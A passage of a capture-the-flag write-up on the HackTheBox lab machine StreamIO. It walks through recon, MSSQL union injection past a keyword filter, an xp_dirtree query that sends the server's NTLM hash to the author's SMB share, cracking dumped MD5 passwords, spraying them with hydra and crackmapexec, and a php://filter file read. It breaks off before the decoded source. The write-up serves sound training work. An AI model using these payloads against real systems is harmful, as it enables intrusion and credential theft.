---
title: HTB: StreamIO
url: https://0xdf.gitlab.io/2022/09/17/htb-streamio.html
date: 2022-09-17T13:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: hackthebox, htb-streamio, ctf, nmap, windows, domain-controller, php, wfuzz, vhosts, crackmapexec, feroxbuster, sqli, sqli-union, waf, hashcat, hydra, lfi, rfi, burp, burp-repeater, mssql, sqlcmd, evil-winrm, firefox, firepwd, bloodhound, bloodhound-python, laps, htb-hancliffe, oscp-like-v2, osep-like, oscp-like-v3
---

![StreamIO](https://0xdfimages.gitlab.io/img/streamio-cover.png)

StreamIO is a Windows host running PHP but with MSSQL as the database. It starts with an SQL injection, giving admin access to a website. Then there’s a weird file include in a hidden debug parameter, which eventually gets a remote file include giving execution and a foothold. With that I’ll gain access to a high privileged access to the db, and find another password in a backup table. From that user, I’ll fetch saved Firefox credentials, and use those to read a LAPS password and get an administrator shell.

## Box Info

| Name | [StreamIO](https://hackthebox.com/machines/streamio)  [StreamIO](https://hackthebox.com/machines/streamio) [Play on HackTheBox](https://hackthebox.com/machines/streamio) |
| --- | --- |
| Release Date | [04 Jun 2022](https://twitter.com/hackthebox_eu/status/1532376507741618176) |
| Retire Date | 17 Sep 2022 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for StreamIO |
| Radar Graph | Radar chart for StreamIO |
| First Blood User | 01:22:52[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 01:38:38[Geiseric Geiseric](https://app.hackthebox.com/users/184611) |
| Creators | [JDgodd JDgodd](https://app.hackthebox.com/users/481778)  [nikk37 nikk37](https://app.hackthebox.com/users/247264) |

## Recon

### nmap

`nmap` finds a 19 open TCP ports, looking like a Windows domain controller:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.158
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-12 17:25 UTC
Nmap scan report for 10.10.11.158
Host is up (0.086s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49701/tcp open  unknown
55088/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.158
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-12 17:26 UTC
Nmap scan report for 10.10.11.158
Host is up (0.086s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-13 00:29:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2022-09-13T00:32:25+00:00; +7h03m09s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=9/12%Time=631F6BBC%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h03m08s, deviation: 0s, median: 7h03m08s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-09-13T00:31:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 305.85 seconds

```

Based on the [IIS Version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions) on 80, the host is likely running Windows 10+ or Server 2016+.

The combination of services (DNS 53, Kerberos 88, LDAP 389 and others, SMB 445, RPC 135, Netbios 139, and others) suggests this is a domain controller.

There’s also two DNS names on the TLS certificate on 443, `streamIO.htb` and `watch.streamIO.htb`. I’ll add those to my `/etc/hosts` file.

It’s interesting that there’s no script returns from SMB (445). Often there’s a hostname in that result.

Given the presences of web on 80 and 443, I’ll want to enum that for sure, along with SMB (445). My next tier of enumeration will be LDAP and RPC. I could also try to brute force some usernames against Kerberos.

### Subdomain Fuzz

Given the use of DNS names, I’ll fuzz for other subdomains, but only find `watch` on 443 which I already know about and nothing on 80:

```

oxdf@hacky$ wfuzz -u https://streamio.htb -H "Host: FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 315                           
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000002268:   200        78 L     245 W    2829 Ch     "watch"

Total time: 44.13086
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 113.0501

oxdf@hacky$ wfuzz -u http://streamio.htb -H "Host: FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 703
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://streamio.htb/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

Total time: 44.25053
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 112.7443

```

### SMB - TCP 445

`crackmapexec` is able to return a hostname, `DC.streamIO.htb`:

```

oxdf@hacky$ crackmapexec smb 10.10.11.158
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)

```

I’ll add that to `/etc/hosts` as well.

Unfortunately, without auth, I’m unable to get anything else out of SMB:

```

oxdf@hacky$ smbclient -L //10.10.11.158 -N
session setup failed: NT_STATUS_ACCESS_DENIED

```

### Website - TCP 80

The page is a standard IIS default page:

![image-20220912140616784](https://0xdfimages.gitlab.io/img/image-20220912140616784.png)

Nothing interesting here.

### streamio.htb - TCP 443

#### Site

Trying to visit the site by IP just returns a 404 error. Using the domain name shows that the site is for a streaming service:

[![image-20220912141524919](https://0xdfimages.gitlab.io/img/image-20220912141524919.png)](https://0xdfimages.gitlab.io/img/image-20220912141524919.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220912141524919.png)

The About page has some information about the leadership, where I can collect the names Barry, Oliver, and Samantha:

![image-20220912141855883](https://0xdfimages.gitlab.io/img/image-20220912141855883.png)

There’s a contact page, and when I submit something, it says to look for a reply in email:

![image-20220912141748783](https://0xdfimages.gitlab.io/img/image-20220912141748783.png)

That could be a way to get something in front of an admin (XSS or a link to click), but I’ll put that to the side for now.

#### Tech Stack

The page URLS all end in `.php`, so the site is written in PHP. There’s a `PHPSESSID` cookie in the response headers as well:

```

HTTP/2 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.2.26
Set-Cookie: PHPSESSID=8qvsofr72h2miuf1erv1dqrh3b; path=/
X-Powered-By: ASP.NET
Date: Tue, 13 Sep 2022 01:14:15 GMT
Content-Length: 13497

```

There is a `X-Powered-By: ASP.NET`, but that’s likely the default IIS. Still, a `.aspx` webshell could potentially run if I can get it uploaded.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, giving it the extension `.php` since I know that’s in use, and using a lowercase wordlist as IIS is case-insensitive:

```

oxdf@hacky$ feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://streamio.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        2l       10w      150c https://streamio.htb/admin => https://streamio.htb/admin/
200      GET      395l      915w    13497c https://streamio.htb/
301      GET        2l       10w      151c https://streamio.htb/images => https://streamio.htb/images/
301      GET        2l       10w      147c https://streamio.htb/js => https://streamio.htb/js/
301      GET        2l       10w      148c https://streamio.htb/css => https://streamio.htb/css/
302      GET        0l        0w        0c https://streamio.htb/logout.php => https://streamio.htb/
200      GET      121l      291w     4500c https://streamio.htb/register.php
200      GET      206l      430w     6434c https://streamio.htb/contact.php
200      GET      111l      269w     4145c https://streamio.htb/login.php
301      GET        2l       10w      153c https://streamio.htb/admin/js => https://streamio.htb/admin/js/
301      GET        2l       10w      154c https://streamio.htb/admin/css => https://streamio.htb/admin/css/
301      GET        2l       10w      157c https://streamio.htb/admin/images => https://streamio.htb/admin/images/
200      GET      231l      571w     7825c https://streamio.htb/about.php
200      GET      395l      915w    13497c https://streamio.htb/index.php
301      GET        2l       10w      150c https://streamio.htb/fonts => https://streamio.htb/fonts/
403      GET        1l        1w       18c https://streamio.htb/admin/index.php
301      GET        2l       10w      156c https://streamio.htb/admin/fonts => https://streamio.htb/admin/fonts/
200      GET        2l        6w       58c https://streamio.htb/admin/master.php
[####################] - 6m    584848/584848  0s      found:18      errors:88     
[####################] - 6m     53168/53168   136/s   https://streamio.htb 
[####################] - 6m     53168/53168   135/s   https://streamio.htb/admin 
[####################] - 6m     53168/53168   136/s   https://streamio.htb/ 
[####################] - 6m     53168/53168   136/s   https://streamio.htb/images 
[####################] - 6m     53168/53168   135/s   https://streamio.htb/js 
[####################] - 6m     53168/53168   136/s   https://streamio.htb/css 
[####################] - 6m     53168/53168   136/s   https://streamio.htb/admin/js 
[####################] - 6m     53168/53168   136/s   https://streamio.htb/admin/css 
[####################] - 6m     53168/53168   136/s   https://streamio.htb/admin/images 
[####################] - 6m     53168/53168   136/s   https://streamio.htb/fonts 
[####################] - 6m     53168/53168   136/s   https://streamio.htb/admin/fonts 

```

`/admin/index.php` returns 403 forbidden. There’s a `/admin/master.php` page that says it’s only available through includes:

![image-20220912142748869](https://0xdfimages.gitlab.io/img/image-20220912142748869.png)

#### login.php

There’s a login page here:

![image-20220912145929891](https://0xdfimages.gitlab.io/img/image-20220912145929891.png)

There is a tiny link to `register.php` (also observed with `feroxbuster`) at the bottom.

Some basic SQL injections don’t get anywhere, but it turns out this page is vulnerable to SQL injection. It’s not part of the intended path for the box, but I’ll explore that in [Beyond Root].

#### register.php

This form allows me to register:

![image-20220912150108996](https://0xdfimages.gitlab.io/img/image-20220912150108996.png)

Once I submit, it says the account is created:

![image-20220912150024543](https://0xdfimages.gitlab.io/img/image-20220912150024543.png)

But even then, I am not able to log in:

![image-20220912150323468](https://0xdfimages.gitlab.io/img/image-20220912150323468.png)

### watch.streamio.htb

#### Site

The site has a FAQ and a subscribe form:

![image-20220912150804847](https://0xdfimages.gitlab.io/img/image-20220912150804847.png)

Adding an email via that form reports it works:

![image-20220912150846773](https://0xdfimages.gitlab.io/img/image-20220912150846773.png)

#### Tech Stack

This site looks like PHP as well based on the headers:

```

HTTP/2 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.2.26
X-Powered-By: ASP.NET
Date: Tue, 13 Sep 2022 02:07:20 GMT
Content-Length: 2829

```

#### Directory Brute Force

`feroxbuster` run the same way as for the main domain finds two more pages:

```

oxdf@hacky$ feroxbuster -u https://watch.streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://watch.streamio.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       78l      245w     2829c https://watch.streamio.htb/
200      GET     7193l    19558w   253887c https://watch.streamio.htb/search.php
301      GET        2l       10w      157c https://watch.streamio.htb/static => https://watch.streamio.htb/static/
301      GET        2l       10w      161c https://watch.streamio.htb/static/css => https://watch.streamio.htb/static/css/
301      GET        2l       10w      160c https://watch.streamio.htb/static/js => https://watch.streamio.htb/static/js/
200      GET       78l      245w     2829c https://watch.streamio.htb/index.php
200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php
[####################] - 2m    265840/265840  0s      found:7       errors:0      
[####################] - 2m     53168/53168   314/s   https://watch.streamio.htb 
[####################] - 2m     53168/53168   315/s   https://watch.streamio.htb/ 
[####################] - 2m     53168/53168   315/s   https://watch.streamio.htb/static 
[####################] - 2m     53168/53168   315/s   https://watch.streamio.htb/static/css 
[####################] - 2m     53168/53168   314/s   https://watch.streamio.htb/static/js 

```

#### blocked.php

`blocked.php` shows that I’ve been blocked for five minutes:

![image-20220912151140219](https://0xdfimages.gitlab.io/img/image-20220912151140219.png)

I’ll want to be careful with any activity that might set off a web application firewall (WAF).

#### search.php

`search.php` shows a list of hundreds movies with “Watch” buttons:

![image-20220916133042771](https://0xdfimages.gitlab.io/img/image-20220916133042771.png)

Clicking “Watch” just says the feature isn’t available:

![image-20220912151958023](https://0xdfimages.gitlab.io/img/image-20220912151958023.png)

Entering something into the search bar filters the results. For example, entering “test” returns:

![image-20220912152114333](https://0xdfimages.gitlab.io/img/image-20220912152114333.png)

So it’s clearly using wildcards on both sides of my input.

Interestingly, this is not done client-side, but rather there’s a POST to `/search.php` with the body having the query:

```

POST /search.php HTTP/2
Host: watch.streamio.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Origin: https://watch.streamio.htb
Referer: https://watch.streamio.htb/search.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

q=test

```

## Shell as yoshihide

### SQL Injection

#### “WAF”

There’s some kind of WAF that returns a 302 to `blocked.php` based on certain key words. For example, if I search for “0xdf”:

```

HTTP/2 302 Found
Content-Type: text/html; charset=UTF-8
Location: https://watch.streamio.htb/blocked.php
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.2.26
X-Powered-By: ASP.NET
Date: Tue, 13 Sep 2022 02:56:03 GMT
Content-Length: 7

blocked

```

I’m guessing “0x” is in the blocked list because it’s used by `sqlmap`. “\*\*”, “all”, and “null” also trigger the redirect. Fortunately, there’s not actually a block, as I can go right back to the search page and try again.

#### Identify

If I just pass a `'` into the query, it returns no results. It’s actually good practice from the development side to catch errors in the SQL and manage that on the server side. That doesn’t mean it’s not vulnerable to SQL injection.

I’ll notice that when I put in “test”, it returns “The Greatest Showman”. That implies that the DB query is something like:

```

select * from movies where title like '%[input]%';

```

If that’s injectable, then I could try something that won’t crash, but might still return results. For example, what if I try “man’;– -“. If this is injectable, that would result in:

```

select * from movies where title like '%man';-- -%';

```

If that worked, I’d expect to get all movies ending in “man”. It does!

![image-20220912154957994](https://0xdfimages.gitlab.io/img/image-20220912154957994.png)

This is SQL injection. If it were not, it would expect 0 results (because no movies have “’;– -“ in their title).

Another query that shows this is “’’;– -“. This shouldn’t match on any movie title. But it returns lots of (presumably all?) titles:

![image-20220912155157821](https://0xdfimages.gitlab.io/img/image-20220912155157821.png)

I’ll also note that in both cases, the titles aren’t alphabetically sorted like they were in the general non-injection query, which implies that there’s a “order by” at the end of the query that gets commented out by the injection.

#### Union

I’ll try a UNION injection, and first I’ll need to know the number of columns. I’ll try `abcd' union select 1;-- -`, and work on adding columns until I get results at `abcd' union select 1,2,3,4,5,6;-- -`:

![image-20220912160320344](https://0xdfimages.gitlab.io/img/image-20220912160320344.png)

I’ll try to get the DB version. [This cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet#database-version) shows how with different database types. It’s fair to guess that this is either MSSQL (since it’s Windows) or MySQL (very common with PHP). Both of those use `@@version`, and it works:

![image-20220912160305018](https://0xdfimages.gitlab.io/img/image-20220912160305018.png)

It’s worth noting that `' union select 1,2,3,4,5,6;-- -` returns nothing. I can’t explain this.

### NTLM Hash - Dead End

Because this is MSSQL, there’s a good chance I can use stacked queries in this injection, so I’ll try to use that to get a Net-NTLMv2 hash (really a challenge and response). I have a detailed [blog post from 2019](/2019/01/13/getting-net-ntlm-hases-from-windows.html) about how this works, but the quick version is that I’ll use the `xp_dirtree` stored procedure to try to load a share on my computer. I’ll use [Responder](https://github.com/SpiderLabs/Responder) to capture the hash of the authenticating account. I’ll start `responder` with `sudo responder -I tun0`. Then I’ll send:

```

abcd'; use master; exec xp_dirtree '\\10.10.14.6\share';-- -

```

Nothing will come back on the page, but there is a connection at `responder`:

```

[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.158
[SMB] NTLMv2-SSP Username : streamIO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::streamIO:63c8495b2f15ac52:BC9ECFC7DE5F81A1C8CB9BD865873B43:010100000000000000901E25E5C6D8018E57573EFE652D490000000002000800420055004E00560001001E00570049004E002D004300540054004100430035004D004C00510039004B0004003400570049004E002D004300540054004100430035004D004C00510039004B002E00420055004E0056002E004C004F00430041004C0003001400420055004E0056002E004C004F00430041004C0005001400420055004E0056002E004C004F00430041004C000700080000901E25E5C6D8010600040002000000080030003000000000000000000000000030000081C387EB6618F4055A81A59670B08D5FF6E8C3BDE62A5B1E62C7D56B2A215D0A0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000

```

Unfortunately, because this is a machine account, it’s very unlikely to be crackable. I can try with `hashcat`, but it won’t crack. If the service had been running as a regular user, I might have collected a credential this way.

### Get Passwords

#### Enumerate Database

Going back to the database, I’ll see what information I can pull out. I can list the DBs and get the current DB with `abcd' union select 1,name,DB_NAME(),4,5,6 from master..sysdatabases;-- -`:

![image-20220912172402800](https://0xdfimages.gitlab.io/img/image-20220912172402800.png)

master, model, msdb, and tempdb are all [MSSQL system DBs](https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver16). The current DB is `STREAMIO`:

![image-20220912173440774](https://0xdfimages.gitlab.io/img/image-20220912173440774.png)

There are two tables in `STREAMIO`:

![image-20220912173655430](https://0xdfimages.gitlab.io/img/image-20220912173655430.png)

I get both the name and the id of the table so I can use the ID to get the columns.

If I try to get the tables in `streamio_backup`, it returns nothing. This is likely a permissions issue (I’ll confirm that later).

I’ll get the columns for both tables with:

```

abcd' union select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- -

```

![image-20220912174219056](https://0xdfimages.gitlab.io/img/image-20220912174219056.png)

That’s a bit confusing because it has columns in there mixed together, but overall, the `users` table seems like the interesting one.

Unfortunately I can’t use `ORDER BY` as it triggers the WAF.

#### Get Passwords

I’ll use a query to generate all the usernames and passwords:

[![image-20220912174550305](https://0xdfimages.gitlab.io/img/image-20220912174550305.png)](https://0xdfimages.gitlab.io/img/image-20220912174550305.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220912174550305.png)

#### Crack Passwords

I’ll get all of these into a text file, clean it up so that it looks like:

```

oxdf@hacky$ cat user-passwords
0xdf:45355af87b2809470423744e0bd9b3a8
admin:665a50ac9eaa781e4f7f04199db97a11
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Austin:0049ac57646627b8d7aeaccf8b6a936f
Barbra:3961548825e3e21df5646cafe11c6c76
...[snip]...

```

To crack this many, I’ll run them through `hashcat`, using mode 0 for raw MD5s, and giving `--user` to tell it to remove the `username:` from the front of the string when cracking:

```

$/opt/hashcat-6.2.5/hashcat.bin user-passwords /usr/share/wordlists/rockyou.txt --user -m 0
...[snip]...
$/opt/hashcat-6.2.5/hashcat.bin user-passwords /usr/share/wordlists/rockyou.txt --user -m 0 --show
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
dfdfdf:ae27a4b4821b13cad2a17a75d219853e:dfdfdf
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..

```

### Check Passwords

#### SMB

The first place I’ll check these is with SMB. To use the usernames and passwords in order, I’ll generate a list of usernames and another of passwords:

```

oxdf@hacky$ cat cracked-passwords | cut -d: -f1 > user
oxdf@hacky$ cat cracked-passwords | cut -d: -f3 > pass

```

With the `--no-bruteforce` option ,it will match each user with the corresponding password (rather than trying all with all as is the default behavior). Everything fails:

```

oxdf@hacky$ crackmapexec smb 10.10.11.158 -u user -p pass --no-bruteforce --continue-on-success
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Barry:$hadoW STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Bruno:$monique$1991$ STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Clara:%$clara STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Juliette:$3xybitch STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lenord:physics69i STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Michelle:!?Love?!123 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Thane:highschoolmusical STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Victoria:!5psycho8! STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE 

```

I could try WinRM, but it’s unlikely to work there if it doesn’t work on SMB.

#### Website Admin

I’ll try the `login.php` page on `streamio.htb` using `hydra`. It takes a single file with `[username]:[password]`, which I can generate as:

```

oxdf@hacky$ cat cracked-passwords | cut -d: -f1,3 > userpass

```

I’ll use the `https-post-form` plugin, which takes a string formatted as `[page to post to]:[post body]:F=[string that indicates failed login]`. It finds one that works:

```

oxdf@hacky$ hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-12 21:54:58
[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries, ~1 try per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-12 21:55:00

```

User yoshihide logged in with the password “66boysandgirls..”.

### Get master.php Source

#### Admin Panel

On entering these creds into `/login.php`, it redirects to `/`, and there’s a “LOGOUT” link at the top right:

![image-20220912180805612](https://0xdfimages.gitlab.io/img/image-20220912180805612.png)

If I visit `/admin` now, there’s a simple admin panel page:

![image-20220912180837638](https://0xdfimages.gitlab.io/img/image-20220912180837638.png)

Clicking on each, they present different objects which I can delete from the DB:

![image-20220912181301676](https://0xdfimages.gitlab.io/img/image-20220912181301676.png)

If I delete a movie, it’s no longer visible on `watch.streamio.htb`.

#### FUZZ Parameters

Each of the links above go to the same URL with a different parameter. For example, “User management” is `https://streamio.htb/admin/?user=`, “Staff management” is `https://streamio.htb/admin/?staff=`, etc.

It’s worth fuzzing to see if there are any other parameters besides `user`, `staff`, `movie`, and `message`.

I’ll need to grab my cookie from the browser dev tools and then I can use `wfuzz`:

```

oxdf@hacky$ wfuzz -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=jtde06u71uq4t7pvs59b8iis1o" --hh 1678
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/admin/?FUZZ=
Total requests: 6453

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000001575:   200        49 L     137 W    1712 Ch     "debug"
000003530:   200        10778 L  25848 W  319875 Ch   "movie"
000005450:   200        398 L    916 W    12484 Ch    "staff"
000006133:   200        98 L     241 W    3186 Ch     "user"

Total time: 58.96430
Processed Requests: 6453
Filtered Requests: 6449
Requests/sec.: 109.4390

```

It finds one more, `debug`!

#### master.php

I’ll try a handful of things in `debug=`, and when I try `debug=index.php`, it prints an additional message:

![image-20220912183317763](https://0xdfimages.gitlab.io/img/image-20220912183317763.png)

`login.php` doesn’t show anything. Remembering the `/admin/master.php` from earlier, trying `master.php` loads the page with movies, users, and staff!

![image-20220912183537369](https://0xdfimages.gitlab.io/img/image-20220912183537369.png)

![image-20220912183559803](https://0xdfimages.gitlab.io/img/image-20220912183559803.png)

I’ll use a PHP filter to get the source for `master.php` by visiting `https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php`:

![image-20220912183734601](https://0xdfimages.gitlab.io/img/image-20220912183734601.png)

I’ll decode that to get `master.php`:

```

